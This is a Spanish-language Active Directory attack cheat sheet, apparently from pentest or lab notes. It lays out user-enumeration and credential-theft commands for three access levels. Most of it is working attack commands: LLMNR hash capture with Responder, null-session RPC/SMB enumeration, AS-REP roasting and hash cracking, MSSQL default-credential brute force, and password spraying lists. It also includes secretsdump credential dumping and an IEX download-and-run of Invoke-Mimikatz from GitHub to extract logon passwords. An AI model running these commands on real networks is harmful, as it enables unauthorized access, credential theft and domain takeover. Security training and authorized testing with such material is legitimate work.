# Enumeración de Usuarios — Windows y Active Directory

Tags: #Enumeracion #Usuarios #AD #Windows #RPC #MSSQL #LDAP #Kerberos #SMB #LLMNR #Dominio

## OBJETIVO

Recopilar usuarios válidos del sistema y del dominio en tres escenarios:

- **Escenario 1** → Solo ves los servicios abiertos, sin credenciales
- **Escenario 2** → Estás dentro de la máquina como usuario local
- **Escenario 3** → Tienes un usuario de dominio con credenciales

## TIPS

1. **Nunca dependas de un solo vector → combinar varios da la lista más completa**
2. **Usuarios encontrados → guardar en users.txt → alimentar spraying, AS-REP, Kerberoast**
3. **Las descripciones de usuarios en AD → frecuentemente contienen contraseñas**
4. **LLMNR es pasivo → no genera ruido → activarlo siempre al inicio**
5. **Con la lista de usuarios → password spraying → una clave contra todos**

---

# ESCENARIO 1 — SOLO VES LOS SERVICIOS, SIN CREDENCIALES

## Objetivo

```
Tienes IPs y puertos abiertos
Necesitas encontrar usuarios válidos para después buscar sus contraseñas
```

---

## 1.1 LLMNR / NBT-NS — Captura pasiva (activar siempre primero)

```bash
❯ responder -I tun0
# Escucha pasiva → cuando un host hace consulta de nombre en la red
# → el host autentica contra Kali → capturas hash NTLMv2
# → el hash revela el nombre del usuario (ej: north\jon.snow)
# → crackear con hashcat -m 5600 → contraseña en claro
# No genera ruido → activarlo siempre al inicio y dejarlo corriendo

❯ responder -I tun0 -v
# -v → ver hashes previamente capturados también
```

### Insight

- Solo esperando → obtienes usuarios reales del dominio + sus hashes
- Es el vector más pasivo y frecuentemente olvidado

---

## 1.2 RPC — Null Session

```bash
❯ rpcclient -U "" -N <IP❯
# Intenta sesión sin credenciales → si funciona → oro puro

# Dentro de rpcclient
❯ enumdomusers
# Lista TODOS los usuarios del dominio con RID
# Output: user:[jon.snow] rid:[0x450]

❯ enumdomgroups
# Grupos del dominio

❯ queryuser 0x450
# Info detallada por RID → revisar descripción → puede tener contraseña

# Extraer lista limpia de usuarios
❯ rpcclient -U "" -N <IP❯ -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]' ❯ users.txt
```

---

## 1.3 SMB — Null Session y RID Brute

```bash
❯ nxc smb <IP❯ -u '' -p '' --rid-brute
# RID brute sin credenciales → enumera usuarios y grupos por ID
# Funciona en muchos sistemas mal configurados

❯ nxc smb <IP❯ -u '' -p '' --users
# Null session → listar usuarios directamente

❯ enum4linux-ng -A <IP❯
# Enumeración completa SMB/RPC sin credenciales
# Incluye: usuarios, grupos, shares, políticas, info del dominio

❯ enum4linux -a <IP❯
# Versión clásica → alternativa
```

---

## 1.4 Kerbrute — Validar wordlist contra el DC

```bash
# No necesitas credenciales → Kerberos responde diferente ante usuarios válidos e inválidos

❯ kerbrute userenum -d domain.corp --dc <IP_DC❯ \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
# Validar wordlist grande contra el DC

❯ kerbrute userenum -d domain.corp --dc <IP_DC❯ \
  /usr/share/seclists/Usernames/Names/names.txt -o valid_users.txt
# Guardar usuarios válidos a archivo

# Wordlists recomendadas en orden de uso
/usr/share/seclists/Usernames/top-usernames-shortlist.txt    # Rápida → empezar aquí
/usr/share/seclists/Usernames/Names/names.txt                # Media
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  # Completa
```

---

## 1.5 LDAP — Anonymous Bind

```bash
❯ ldapsearch -x -H ldap://<IP❯ -s base namingcontexts
# Verificar si anonymous bind está habilitado
# Si devuelve el base DN → continuar

❯ ldapsearch -x -H ldap://<IP❯ -b "DC=domain,DC=corp" \
  "(objectClass=person)" sAMAccountName
# Listar usuarios sin credenciales si anonymous bind está activo

❯ nxc ldap <IP❯ -u '' -p '' --users
# Verificación rápida con netexec
```

---

## 1.6 MSSQL — Credenciales por defecto

```bash
# Probar usuario sa (System Administrator) con contraseñas comunes
❯ nxc mssql <IP❯ -u 'sa' -p ''
❯ nxc mssql <IP❯ -u 'sa' -p 'sa'
❯ nxc mssql <IP❯ -u 'sa' -p 'admin'
❯ nxc mssql <IP❯ -u 'sa' -p 'Password1'

# Si sa está habilitado → acceso directo
❯ nmap <IP❯ -p 1433 --script ms-sql-empty-password
# Detectar usuarios sin contraseña en MSSQL

# Fuerza bruta al sa
❯ nxc mssql <IP❯ -u 'sa' -p /usr/share/seclists/Passwords/Common-Credentials/best110.txt
```

---

## 1.7 AS-REP Roasting — Sin credenciales

```bash
# Cuentas sin preautenticación Kerberos → no necesitas contraseña
# Solo necesitas una lista de usuarios válidos

❯ impacket-GetNPUsers domain.corp/ -no-pass \
  -usersfile users.txt -dc-ip <IP_DC❯ -outputfile asrep.txt
# Devuelve hashes krb5asrep de cuentas vulnerables

❯ hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# Crackear → contraseña en claro → credenciales de dominio
```

---

## 1.8 SNMP — Si el puerto 161 UDP está abierto

```bash
❯ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP❯
# Fuerza bruta de community strings → encontrar strings válidos

❯ snmpwalk -v2c -c public <IP❯ 1.3.6.1.4.1.77.1.2.25
# OID específico → usuarios locales Windows

❯ nmap -sU -p161 --script snmp-win32-users <IP❯
# Usuarios Windows vía SNMP con nmap
```

---

## 1.9 DNS — Zone Transfer

```bash
❯ dnsrecon -d domain.corp -t axfr
# Zone transfer → si está habilitado → todos los registros
# Revela hostnames → pistas sobre usuarios y servicios

❯ nmap --script dns-brute domain.corp
# Fuerza bruta de subdominios → encontrar más hosts
```

---

# ESCENARIO 2 — ESTÁS DENTRO DE LA MÁQUINA COMO USUARIO LOCAL

## Objetivo

```
Tienes shell en la máquina como usuario local (normal o admin)
Enumerar usuarios locales y buscar credenciales para escalar o moverse
```

---

## 2.1 Como usuario local normal

```bash
# Usuarios del sistema
❯ net user
# Usuarios locales de la máquina

❯ net localgroup
# Grupos locales disponibles

❯ net localgroup administrators
# Ver quién es admin local → objetivo a alcanzar

❯ query user
# Ver si hay otros usuarios con sesión activa → pueden tener creds en memoria

❯ wmic useraccount list brief
# Usuarios locales con WMI → más detalle

# PowerShell
❯ Get-LocalUser
❯ Get-LocalUser | Select Name,Enabled,LastLogon
❯ Get-LocalGroupMember Administrators

# Ver si la máquina está en dominio
❯ systeminfo | findstr /B /C:"Domain"
❯ echo %LOGONSERVER%
# Si hay dominio → los usuarios de dominio son más valiosos

# Buscar credenciales guardadas
❯ cmdkey /list
# Credential Manager → puede tener creds guardadas de otros usuarios

❯ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# Autologon → contraseña de usuario en claro
```

---

## 2.2 Como administrador local

```bash
# Con admin local → más vectores disponibles

# Dump de hashes SAM → usuarios locales y sus hashes
❯ impacket-secretsdump domain/adminlocal:pass@<IP❯
# Desde Kali → extrae SAM + LSA Secrets + cached credentials
# Cached credentials → hashes de usuarios de dominio que se loguearon antes

# Ver usuarios de dominio logueados actualmente
❯ query user
# Si hay DA logueado → mimikatz → sus credenciales

# Historial de PowerShell → credenciales usadas en comandos anteriores
❯ Get-Content (Get-PSReadLineOption).HistorySavePath
❯ type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Buscar credenciales en archivos del sistema
❯ findstr /si "password" C:\*.xml C:\*.txt C:\*.ini C:\*.config 2❯nul
❯ dir /s /b *pass* *cred* *secret* 2❯nul

# Archivos críticos a revisar
❯ type C:\unattend.xml
❯ type C:\Windows\Panther\Unattend.xml
❯ type C:\inetpub\wwwroot\web.config
❯ type C:\Windows\System32\inetsrv\config\applicationHost.config
```

### Mimikatz 

```powershell 
# Descargamos el binario del repositorio
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1');

# Utilizamos la funcion para ejecutar Mimikatz
❯ Invoke-Mimikatz -Command '"token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets"'
```

---

## 2.3 MSSQL desde dentro de la máquina

```bash
# Si MSSQL está corriendo localmente → conectar sin credenciales de red
❯ sqlcmd -S localhost -Q "SELECT name FROM sys.server_principals WHERE type IN ('U','G')"
# Usuarios Windows con acceso al MSSQL

❯ sqlcmd -S localhost -Q "SELECT name, type_desc, is_disabled FROM sys.server_principals"
# Todos los logins → usuarios de dominio que tienen acceso al SQL

❯ sqlcmd -S localhost -Q "SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE'"
# Ver si hay impersonación configurada → vector de escalada en MSSQL

# Desde PowerShell
❯ Invoke-Sqlcmd -Query "SELECT name FROM sys.server_principals" -ServerInstance localhost
```

---

# ESCENARIO 3 — TIENES USUARIO DE DOMINIO CON CREDENCIALES

## Objetivo

```
Tienes credenciales de un usuario de dominio (normal, no admin)
Enumerar todo el dominio → usuarios, grupos, ACLs, paths hacia DA
```

---

## 3.1 Enumeración rápida con NetExec

```bash
❯ nxc smb <IP❯ -u 'user' -p 'pass' --users
# Lista completa de usuarios del dominio

❯ nxc smb <IP❯ -u 'user' -p 'pass' --groups
# Grupos del dominio

❯ nxc smb <IP❯ -u 'user' -p 'pass' --loggedon-users
# Ver qué usuarios tienen sesión activa en ese host ahora mismo
# Si hay DA logueado → ese host es objetivo prioritario

❯ nxc smb <subred❯/24 -u 'user' -p 'pass' --loggedon-users
# Escanear toda la subred → encontrar hosts con DAs logueados

❯ nxc smb <subred❯/24 -u 'user' -p 'pass'
# Ver a qué hosts tengo acceso con estas creds
# [Pwn3d!] → tienes admin en ese host
```

---

## 3.2 LDAP — Enumeración completa

```bash
❯ ldapdomaindump -u 'domain.corp\user' -p 'pass' <IP❯
# Dump completo → genera HTML navegable
# domain_users.html → revisar descripción de cada usuario → buscar contraseñas

❯ ldapsearch -x -H ldap://<IP❯ \
  -D "cn=user,DC=domain,DC=corp" -w 'pass' \
  -b "DC=domain,DC=corp" \
  "(objectClass=person)" sAMAccountName description
# Usuarios con sus descripciones → buscar contraseñas hardcodeadas

❯ nxc ldap <IP❯ -u 'user' -p 'pass' --users
# Lista rápida de usuarios

❯ nxc ldap <IP❯ -u 'user' -p 'pass' --admin-count
# Usuarios con adminCount=1 → históricamente privilegiados

❯ nxc ldap <IP❯ -u 'user' -p 'pass' --password-not-required
# Cuentas sin contraseña requerida → AS-REP Roasting targets
```

---

## 3.3 Impacket — Enumeración de usuarios

```bash
❯ impacket-GetADUsers -all domain.corp/user:pass -dc-ip <IP❯
# Lista completa de usuarios del dominio

❯ impacket-GetADUsers -all domain.corp/user:pass -dc-ip <IP❯ -pwd-last-set
# Con fecha del último cambio de contraseña
# Contraseñas muy antiguas → más probable que sean débiles

❯ impacket-GetUserSPNs domain.corp/user:pass -dc-ip <IP❯
# Usuarios con SPNs → Kerberoasting targets

❯ impacket-GetNPUsers domain.corp/user:pass -dc-ip <IP❯ -request
# Usuarios sin preauth → AS-REP Roasting con creds → más completo
```

---

## 3.4 BloodHound / SharpHound — Mapa completo del dominio

```bash
# Desde la máquina comprometida
❯ .\SharpHound.exe -c All
# Recolecta TODOS los usuarios, grupos, ACLs, sesiones, etc.
# Genera .zip → transferir a Kali → importar en BloodHound

# Desde Kali sin subir nada a la víctima
❯ bloodhound-python -u user -p pass -d domain.corp -dc <IP_DC❯ -c All
# Genera JSON → importar en BloodHound

# En BloodHound → análisis de usuarios:
# Analysis → List all Domain Users → todos los usuarios
# Analysis → Find Users with Description Keyword → "pass", "pwd", "key", "temp"
# Analysis → Find Kerberoastable Users → cuentas con SPNs
# Analysis → Find AS-REP Roastable Users → sin preauth
```

---

## 3.5 MSSQL con usuario de dominio

```bash
# Conectar al MSSQL con credenciales de dominio
❯ impacket-mssqlclient domain.corp/'user:pass'@<IP❯ -windows-auth

# Dentro del MSSQL → enumerar usuarios con acceso
❯ SELECT name, type_desc FROM sys.server_principals WHERE type IN ('U','G')
# Usuarios de dominio con acceso al SQL

❯ SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'
# Ver impersonación → jon.snow puede ser samwel.tarlly → sa

❯ SELECT distinct b.name FROM sys.server_permissions a
  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE'
# Lista exacta de usuarios que puedo impersonar

❯ SELECT * FROM sys.servers
# Linked servers → otros servidores SQL enlazados → pivoting

❯ EXECUTE AS LOGIN = 'samwel.tarlly'
❯ SELECT IS_SRVROLEMEMBER('sysadmin')
# 1 → soy SA → xp_cmdshell → RCE
```

---

## 3.6 Password Spraying con la lista obtenida

```bash
# Con la lista de usuarios → probar contraseñas comunes
❯ kerbrute passwordspray -d domain.corp --dc <IP_DC❯ users.txt 'Password123'
❯ kerbrute passwordspray -d domain.corp --dc <IP_DC❯ users.txt 'Welcome1'
❯ kerbrute passwordspray -d domain.corp --dc <IP_DC❯ users.txt 'Empresa2024'

❯ nxc smb <IP❯ -u users.txt -p 'Password123' --continue-on-success
# Una contraseña contra todos los usuarios → evitar lockout

# Contraseñas comunes a probar
Password123 / Password1 / Welcome1 / Welcome123
Empresa + año → Goad2024, North2024
Estación + año → Winter2024, Summer2024
NombreEmpresa123
```

---

## CONSOLIDAR LA LISTA DE USUARIOS

```bash
# Combinar usuarios de múltiples fuentes y eliminar duplicados
❯ cat users_rpcclient.txt users_ldap.txt users_kerbrute.txt users_nxc.txt \
  | sort -u ❯ all_users.txt

# Usar la lista consolidada en:
❯ kerbrute passwordspray -d domain.corp --dc <IP_DC❯ all_users.txt 'Password123'
❯ impacket-GetNPUsers domain.corp/ -no-pass -usersfile all_users.txt -dc-ip <IP_DC❯
❯ impacket-GetUserSPNs domain.corp/user:pass -dc-ip <IP_DC❯ -request
```

---

## FLUJO COMPLETO

```
¿En qué escenario estoy?
│
├── Solo veo servicios abiertos (Escenario 1)
│     ├── Responder → captura pasiva → hashes + nombres de usuarios
│     ├── rpcclient null session → enumdomusers
│     ├── nxc smb null session → --rid-brute
│     ├── kerbrute → validar wordlist contra DC
│     ├── ldapsearch anonymous bind
│     ├── mssql → probar sa sin contraseña
│     └── snmp → si 161 UDP abierto → usuarios locales
│
├── Estoy dentro como usuario local (Escenario 2)
│     ├── Normal → net user, query user, cmdkey /list
│     ├── Admin → secretsdump desde Kali → SAM + LSA + cached creds
│     └── MSSQL local → sys.server_principals → impersonación
│
└── Tengo usuario de dominio (Escenario 3)
      ├── nxc smb --users → lista completa rápida
      ├── nxc smb --loggedon-users → ¿hay DA logueado?
      ├── ldapdomaindump → descripciones con contraseñas
      ├── SharpHound → BloodHound → mapa completo
      ├── impacket-GetUserSPNs → Kerberoasting targets
      ├── impacket-GetNPUsers → AS-REP targets
      └── mssql → sys.server_principals → impersonación → linked servers
```